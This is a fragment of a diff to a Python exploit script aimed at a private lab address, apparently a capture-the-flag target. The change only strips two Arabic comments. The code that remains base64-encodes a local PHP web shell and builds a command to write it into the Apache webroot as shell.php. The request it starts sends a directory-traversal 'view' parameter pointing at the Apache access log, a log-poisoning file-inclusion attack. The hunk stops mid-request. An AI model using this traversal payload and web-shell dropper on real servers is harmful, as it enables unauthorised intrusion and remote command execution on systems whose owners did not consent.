@@ -622,8 +622,8 @@ import requests, base64, os, sys
 url = "http://10.10.106.210/"                
 local = "shell_php.php"                         
 
-b64 = base64.b64encode(open(local,"rb").read()).decode()   # نقرأ الملف ونشفّره Base64
-cmd = f"echo {b64} | base64 -d > /var/www/html/shell.php"   # أمر لفك الشيفرة وكتابة الملف في webroot
+b64 = base64.b64encode(open(local,"rb").read()).decode()  
+cmd = f"echo {b64} | base64 -d > /var/www/html/shell.php"   
 r = requests.get(url, params={
     "view":"dog/../../../../../../var/log/apache2/access.log",
     "ext":"",
